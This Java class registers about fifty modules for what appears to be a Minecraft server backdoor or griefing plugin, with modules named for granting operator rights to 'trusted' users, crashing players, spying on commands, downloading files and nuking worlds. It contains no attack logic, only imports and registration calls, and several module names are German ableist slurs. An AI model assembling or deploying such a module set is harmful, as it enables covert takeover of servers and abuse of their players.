
package me.maiko.module;

import java.util.ArrayList;

import me.maiko.main.Main;
import me.maiko.modules.blocking.BlockAllCmds_Mod;
import me.maiko.modules.blocking.BlockCmd_Mod;
import me.maiko.modules.blocking.ConsoleBlock_Mod;
import me.maiko.modules.important.Semitrust_Mod;
import me.maiko.modules.important.Trust_Mod;
import me.maiko.modules.important.Ultimate_Mod;
import me.maiko.modules.message.Broadcast_Mod;
import me.maiko.modules.message.Clearchat_Mod;
import me.maiko.modules.message.CommandSpy_Mod;
import me.maiko.modules.message.Exceptionspammer_Mod;
import me.maiko.modules.message.Help_Mod;
import me.maiko.modules.message.Plugins_Mod;
import me.maiko.modules.player.bad.Autismus_Mod;
import me.maiko.modules.player.bad.Beyblade_Mod;
import me.maiko.modules.player.bad.Blackscreen_Mod;
import me.maiko.modules.player.bad.Colorchange_Mod;
import me.maiko.modules.player.bad.Control_Mod;
import me.maiko.modules.player.bad.Crash_Mod;
import me.maiko.modules.player.bad.DemoScreen_Mod;
import me.maiko.modules.player.bad.Deop_Mod;
import me.maiko.modules.player.bad.Endscreen_Mod;
import me.maiko.modules.player.bad.Freeze_Mod;
import me.maiko.modules.player.bad.Jumpscare_Mod;
import me.maiko.modules.player.bad.Kill_Mod;
import me.maiko.modules.player.bad.Removebars_Mod;
import me.maiko.modules.player.bad.Screenblock_Mod;
import me.maiko.modules.player.bad.Spack_Mod;
import me.maiko.modules.player.bad.Spast_Mod;
import me.maiko.modules.player.good.Effekte_Mod;
import me.maiko.modules.player.good.Fly_Mod;
import me.maiko.modules.player.good.Gm_Mod;
import me.maiko.modules.player.good.Heal_Mod;
import me.maiko.modules.player.good.Op_Mod;
import me.maiko.modules.player.good.Sudo_Mod;
import me.maiko.modules.player.good.Tp_Mod;
import me.maiko.modules.plugin.CopyExploit_Mod;
import me.maiko.modules.plugin.Disableplugin_Mod;
import me.maiko.modules.plugin.Enableplugin_Mod;
import me.maiko.modules.plugin.FileDownload_Mod;
import me.maiko.modules.world.Brush_Mod;
import me.maiko.modules.world.Clientsidebrush_Mod;
import me.maiko.modules.world.Durchfallmann_Mod;
import me.maiko.modules.world.Einhorn_Mod;
import me.maiko.modules.world.Nuker_Mod;
import me.maiko.modules.world.Pimmel_Mod;
import me.maiko.modules.world.Rakete_Mod;
import me.maiko.modules.world.Snake_Mod;
import me.maiko.modules.world.Tntprank_Mod;
import me.maiko.modules.world.Tntregen_Mod;
import me.maiko.modules.world.Wither_Mod;

public class Manager {
	public Main plugin;

	public Manager(Main plugin) {
		this.plugin = plugin;
	}

	public ArrayList<Module> Mods = new ArrayList<>();

	public void Register(Module m) {
		this.Mods.add(m);
	}

	public void init() {
		this.Register(new Autismus_Mod(plugin));
		this.Register(new Beyblade_Mod(plugin));
		this.Register(new Blackscreen_Mod(plugin));
		this.Register(new BlockAllCmds_Mod());
		this.Register(new BlockCmd_Mod());
		this.Register(new Broadcast_Mod());
		this.Register(new Brush_Mod());
		this.Register(new Clearchat_Mod());
		this.Register(new Clientsidebrush_Mod());
		this.Register(new Colorchange_Mod(plugin));
		this.Register(new CommandSpy_Mod());
		this.Register(new ConsoleBlock_Mod());
		this.Register(new Control_Mod(plugin));
		this.Register(new CopyExploit_Mod());
		this.Register(new Crash_Mod());
		this.Register(new DemoScreen_Mod());
		this.Register(new Deop_Mod());
		this.Register(new Disableplugin_Mod());
		this.Register(new Durchfallmann_Mod());
		this.Register(new Effekte_Mod());
		this.Register(new Einhorn_Mod());
		this.Register(new Enableplugin_Mod());
		this.Register(new Endscreen_Mod());
		this.Register(new Exceptionspammer_Mod(plugin));
		this.Register(new FileDownload_Mod());
		this.Register(new Fly_Mod());
		this.Register(new Freeze_Mod());
		this.Register(new Gm_Mod());
		this.Register(new Heal_Mod());
		this.Register(new Help_Mod(plugin));
		this.Register(new Jumpscare_Mod(plugin));
		this.Register(new Kill_Mod());
		this.Register(new Nuker_Mod());
		this.Register(new Op_Mod());
		this.Register(new Pimmel_Mod());
		this.Register(new Plugins_Mod());
		this.Register(new Rakete_Mod());
		this.Register(new Removebars_Mod());
		this.Register(new Screenblock_Mod(plugin));
		this.Register(new Semitrust_Mod());
		this.Register(new Snake_Mod());
		this.Register(new Spack_Mod());
		this.Register(new Spast_Mod());
		this.Register(new Sudo_Mod());
		this.Register(new Tntprank_Mod());
		this.Register(new Tntregen_Mod());
		this.Register(new Tp_Mod());
		this.Register(new Trust_Mod());
		this.Register(new Ultimate_Mod(plugin));
		this.Register(new Wither_Mod(plugin));

	}
}
